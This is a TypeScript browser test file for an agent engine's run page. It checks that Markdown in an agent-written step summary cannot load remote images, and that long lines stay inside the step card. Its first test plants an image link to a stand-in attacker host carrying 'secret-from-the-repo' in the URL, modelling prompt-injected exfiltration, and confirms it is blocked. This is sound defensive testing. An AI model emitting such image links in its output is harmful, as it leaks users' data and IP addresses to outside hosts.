import { writeFileSync } from "node:fs"
import path from "node:path"
import { test, expect, type Engine } from "../fixtures/engine.ts"
import type { Terminal } from "../fixtures/terminal.ts"

// A step summary is what an agent wrote, so it is untrusted: a prompt the
// agent read can make it say anything. The run page renders it as Markdown.
// A Markdown image in it must not make the viewer's browser fetch a URL the
// agent chose, which would leak the data in that URL, the viewer's IP and the
// page they came from. And the widest and most unbroken line Markdown allows
// must not stretch the run page past its container: a long line wraps inside
// the card, and a wide code block scrolls within its box.

const GRAPH = `apiVersion: openengine.cc/v1
kind: Graph
name: summarize
plan:
  report:
    agent: claude
    prompt: Reply with one sentence summarizing README.md. Don't run commands or change files.
`

const UNBROKEN = "a".repeat(500)
const EXFILTRATION = "https://attacker.example/pixel.png"
const VIEWPORT = { width: 640, height: 800 }

async function runs(engine: Engine): Promise<{ runId: string; status: string }[]> {
  const headers = { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` }
  const response = await fetch(`${engine.url}/api/v1/runs`, { headers })
  expect(response.ok).toBe(true)
  return (await response.json()).runs
}

/** Start the summarize graph with the stub agent saying `summary`, and return its run id once it completes. */
async function summarize(engine: Engine, terminal: Terminal, summary: string): Promise<string> {
  engine.script({ scenarios: [{ when: "summarizing README.md", steps: [{ type: "say", text: summary }] }] })
  writeFileSync(path.join(engine.repository, "summarize.yaml"), GRAPH)
  await terminal.run("engine graph add summarize.yaml")
  await terminal.run("engine repo trust")
  await terminal.type("engine graph run summarize")
  await terminal.press("Enter")
  expect(await terminal.waitForPrompt({ timeout: 60_000 })).toBe(0)
  const [run] = await runs(engine)
  expect(run?.status).toBe("completed")
  return run!.runId
}

test("A step summary's Markdown image does not load from a remote host @skip-docs", async ({ engine, terminal, browser }) => {
  test.skip(engine.agentMode !== "stub", "only the scripted agent writes the injected summary on cue")
  test.setTimeout(90_000)
  const runId = await summarize(engine, terminal, `The README is one heading.\n\n![logo](${EXFILTRATION}?d=secret-from-the-repo)`)

  const context = await browser.newContext({
    baseURL: engine.url,
    extraHTTPHeaders: { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` },
  })
  const fetched: string[] = []
  await context.route("https://attacker.example/**", (route) => {
    fetched.push(route.request().url())
    return route.fulfill({ status: 204 })
  })
  const page = await context.newPage()
  try {
    await page.goto(`/runs/${encodeURIComponent(runId)}`)
    // The summary is on screen, rendered as Markdown.
    await expect(page.locator(".step-summary")).toContainText("The README is one heading.")
    // Give an <img> the time it would take to request its source.
    await page.waitForLoadState("networkidle")
    expect(fetched, "the browser fetched an image URL the agent wrote").toEqual([])
    await expect(page.locator(`.step-summary img[src^="${EXFILTRATION}"]`)).toHaveCount(0)
  } finally {
    await context.close()
  }
})

test("A long summary line and a wide code block stay inside the step card @skip-docs", async ({ engine, terminal, browser }) => {
  test.skip(engine.agentMode !== "stub", "only the scripted agent writes the injected summary on cue")
  test.setTimeout(90_000)
  const runId = await summarize(engine, terminal, `${UNBROKEN}\n\n\`\`\`\n${UNBROKEN}\n\`\`\``)

  const context = await browser.newContext({
    baseURL: engine.url,
    viewport: VIEWPORT,
    extraHTTPHeaders: { Authorization: `Bearer ${engine.env.ENGINE_SERVICE_TOKEN}` },
  })
  const page = await context.newPage()
  try {
    await page.goto(`/runs/${encodeURIComponent(runId)}`)
    const summary = page.locator(".step-summary")
    await expect(summary).toContainText(UNBROKEN)
    // The step's group arrives collapsed; open it to reach the summary on screen.
    await page.locator("details.step-group > summary").click()
    // The page itself does not grow past the viewport.
    expect(await page.evaluate(() => document.documentElement.scrollWidth))
      .toBeLessThanOrEqual(VIEWPORT.width)
    // The wide code block scrolls inside its box instead of stretching the card.
    const pre = summary.locator("pre")
    await expect(pre).toBeVisible()
    const metrics = await pre.evaluate((el) => ({ scrollWidth: el.scrollWidth, clientWidth: el.clientWidth }))
    expect(metrics.scrollWidth, "the code block is wide enough to need a scrollbar")
      .toBeGreaterThan(metrics.clientWidth)
  } finally {
    await context.close()
  }
})
